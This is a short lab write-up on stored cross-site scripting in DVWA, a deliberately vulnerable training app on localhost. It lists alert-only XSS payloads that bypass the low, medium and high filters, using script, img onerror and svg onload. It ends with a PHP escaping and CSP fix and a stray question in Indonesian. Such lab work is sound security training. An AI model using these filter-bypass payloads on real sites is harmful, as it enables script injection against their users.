# Lab DVWA: Stored XSS - Completed by SEC-ACEH

**Target:** http://localhost/vulnerabilities/xss_s/
**Status:** Completed Low, Medium, High
**By:** SEC-ACEH - Blangpidie, Aceh
**Date:** 29 Oct 2026

## Low Security - Exploit
Payload: <script>alert('SEC-ACEH')</script>
Result: Alert executed, stored in DB

## Medium Security - Bypass
Payload: <img src=x onerror=alert('SEC-ACEH Bypass')>
Bypass: <script> filtered, using img tag

## High Security - Bypass
Payload: <svg onload=alert('SEC-ACEH High')>
Result: Still bypass with event handler

## Fix (Impossible Level)
```php
// From DVWA Impossible Source
echo htmlspecialchars($name, ENT_QUOTES);
header("Content-Security-Policy: script-src 'self'"); yang ini bro apa sudah sekalian dengan fix nya
